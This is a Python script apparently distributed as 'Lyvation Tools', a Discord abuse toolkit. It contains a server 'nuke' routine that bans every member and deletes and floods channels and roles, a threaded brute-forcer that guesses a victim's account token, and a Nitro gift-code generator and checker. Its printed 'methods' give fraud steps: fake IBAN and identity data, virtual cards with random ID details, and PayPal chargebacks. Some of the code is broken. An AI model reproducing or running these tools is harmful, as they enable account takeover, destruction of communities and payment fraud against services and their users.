import random, string
import webbrowser
import requests
import time
import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
import pyfiglet
import sys
import re
import json
from urllib.request import Request, urlopen

#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
os.system(f"title Lyvation Tools(Version: 1.0)")

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'Nuke: {guild.name}')
    banned = await ban_all_members(guild)
    print(f'Banned:{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'Delete Channels:{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'Delete Roles:{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'Create Voice Channels:{created_channels}')
    created_roles = await created_roles(guild,name)
    print(f'Create Roles:{created_roles}')
    print(f'--------------------------------------------\n\n')
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
banner = pyfiglet.figlet_format("Lyvation Tools")
print(banner)
time.sleep(1)
print(f"\n{Fore.RED}Lyvation Tools(Version: 1.0): Made by Lyvation#6969")
print("Join my discord https://discord.gg/h7m5FTDsSJ")
while True:
   time.sleep(1)
   print(f"\n{Fore.WHITE}Choose an option:\n1 Nitro Generator\n2 Nitro Checker\n3 Methods\n4 Get anyones token with their username and tag\n5 Nuke servers\n")
   option = input(f"{Fore.BLUE}+")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
   if option == "1":
      print(f'{Fore.WHITE}How many codes do you want to generate?')
      num = input(f"{Fore.BLUE}+")

      f=open("Nitro Codes.txt","w", encoding='utf-8')

      print(f"{Fore.WHITE}Generating codes...")
            
      for n in range(int(num)):
         y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
         f.write('https://discord.gift/')
         f.write(y)
         f.write("\n")

      f.close()
      input("\nFinished, Press enter to go back to the menu. Codes saved in Nitro Codes")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
   if option == "2":
      with open("Nitro Codes.txt") as f:
          for line in f:
              nitro = line.strip("\n")

              url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

              r = requests.get(url)

              if r.status_code == 200:
                  print(" Valid | {} ".format(line.strip("\n")))
                  break
              else:
                      print(" Invalid | {} ".format(line.strip("\n")))
      input("The end! Press enter to return to the menu.")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
   if option == "3":
      print("Available Methods:\n1 Netflix Method\n2 Youtube Premium Method\n3 NordVPN Method\n4 Discord Nitro Method\n5 Make your pc/laptop faster Method\n6 Make money leaving pc\laptop on(not mining)\n")
      method_option = input(f"{Fore.BLUE}+")
      if method_option == "1":
         print("""\nHere's the Netflix VCC method for creating unlimited monthly Netflix.



Requirements:
* An OTP
* Airtel thanks application
* And ExpressVPN or VyprVPN.



Lets Start:
* Simply connect VPN to Switzerland go to netflix.com
(firefox focus browser preferred)

* Select the desired email and pack.

* And select the credit /debit card option.



NOW coming to main part.

* Download Airtel Thanks App(PlayStore)
* Register with any new number and follow some necessary steps of getting a virtual debit card
(if ask for pan card and details fill random it doesnt verify it)



Now once you get the card...
* As we were on the payment page.
* Disconnect VPN when you start entering card details
* Enter card details from airtel VCC.
* Click on continue
* Verify card.
* OTP will come on the number phone.
* Just type OTP...
* Connect the VPN again to Switzerland and boom your Netflix is ready.\n=============================================\n""")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
      if method_option == "2":
         print("""Youtube Premium Method by Lyvation
Requirements: Android Phone

1. Go to https://apkmody.io/apps/youtube/download and download the application
2. Download the file.
3. On your Android phone, open the downloaded file YouTube_v16.19.37.apk.
4. Tap Install.
5. Follow the steps on the screen.

Enjoy your youtube premium!!!\n=============================================\n""")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
      if method_option == "3":
         print("""Nord VPN Method (3yrs)
Step 1 - Connect To Sweden Through Any Vpn
Step 2 - Go To https://nordvpn.com/
Step 3 - Scroll Down And Click On 3 Year Plan
Step 4 - For Email Use Temp Mail 
Step 5 - Select "Direct Debit" And Select Germany As Country.. 
Step 6 - Get Every Information From https://fake-it.ws/
Step 7 - Scroll And Get IBAN Number..
Step 8 - After Filling Everything Click Confirm Ad Then U Will Recieve An Email..
Step 9 - Open The Email And Confirm It..
Step 10 - Set Pswd And Login To nordvpn.com..\n=============================================\n""")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
      if method_option == "4":
         print("""1. Make sure you have at least the amount of money of the nitro you want ( IN PAYPAL)
2. Make a new discord account
3. Go to the Discord store and buy the nitro you want as a gift.
4. Get the gift link and copy it and redeem it to your main
5. When your nitro is going to expire soon charge back on them using paypal.
6. This will take your nitro away but not ban u but possibly ban the ALT you made.
7. Repeat and get free nitro!\n=============================================\n
""")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
      if method_option == "5":
         print("""Increase Virtual RAM - To Make Your System Faster

Follow the steps given below :-

1) Hold down the 'Windows' Key and Press the 'Pause/Break' button at the top right of your keyboard.
Another way is Right-Clicking 'My Computer' and then Select 'Properties'.

2) Click on the 'Advanced' tab.

3) Under 'Performance', click 'Settings'.

4) Then click the 'Advanced' tab on the button that pops up.

5) Under 'Virtual Memory' at the bottom, click 'Change'.

6) Click the 'Custom Size' button.

7) For the initial size (depending on your HD space), type in anywhere from 1000-1500 (although I use 4000), and for the Maximum size type in anywhere from 2000-2500 (although I use 6000).

8) Click 'Set', and then exit out of all of the windows.

9) Finally, Restart your computer.

10) You now have a faster computer and 1-2GB of Virtual RAM..!\n=============================================\n
""")
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
      if method_option == "6":
         print("""Summary: We are going to be taking advantage of a service called Honeygain. Honeygain pays you for any leftover data you aren't using. I have been using it for a week now and have been making around $2-3 dollars a day.
$4-5 if I don't touch my two computers at all . It's a pretty easy method but I guarantee results!

Steps:
1. Sign up to Honeygain > https://r.honeygain.me/PARTHD2E
2. Verify your email otherwise you will not be able to withdraw
3. Download the application (Unfortunately this is only for windows/android users)
4. Run the installer and start the application.
5. Go back to your dashboard and make sure your system shows up.
Conclusion: Check back everyday or so and see how much you have made. The more systems you are running this on. The more money you will make!\n=============================================\n""")

      else:
         pass
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
   if option == "4":
      TOKEN = input("Your token: ")
      os.system('cls')

      class MyClient(discord.Client):
         async def on_ready(self):
            userid = input(f"[{Fore.RED}>{Fore.RESET}] Victim ID : ")
            user = await client.fetch_user(int(userid))
            stamp = user.created_at
            timestamp = str(time.mktime(stamp.timetuple()))
            print(timestamp)
            encodedBytes = base64.b64encode(userid.encode("utf-8"))
            encodedid = str(encodedBytes, "utf-8")
            encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
            encodedstamp = str(encodedBytes, "utf-8")
            print(f"{Fore.WHITE}Attempting to crack {Fore.YELLOW}{user}{Fore.WHITE}'s token")
            time.sleep(3)
         for i in range(10000):
            thr(target = gen, args = (encodedid, encodedstamp)).start()

      def gen(encodedid, encodedstamp):
        while True:
          second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
          end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
          token = f"{encodedid}.{second}.{end}"
          headers = {'Content-Type': 'application/json', 'authorization': token}
          url = "https://discordapp.com/api/v6/users/@me/library"
          r = req.get(url, headers=headers)
          if r.status_code == 200:
              print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
              f = open("token.txt", "a")
              f.write(token)
              f.close() 
              exit(0)
          else:
              print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.RED}Invalid')


      token = os.environ.get(TOKEN)
      client = MyClient()
      client.run(TOKEN, bot=False,)
#EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
   if option == "5":
      token1 = input("Bot token: ")
      name = input("Name of the channels/roles: ")

      client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
      @client.event
      async def on_ready():
         print(f'''
Logged as {client.user.name}
Bot in {len(client.guilds)} servers!''')

         for guild in client.guilds:
            await nuke_guild(guild)
         await client.close()
      
      try:
         client.run(token1)
         input('Nuke finished, press enter for return to menu...')
      except Exception as error:
         if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
            input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
         else:
            input(f'Error\nPress enter for return...')
         continue
      



   else:
      pass
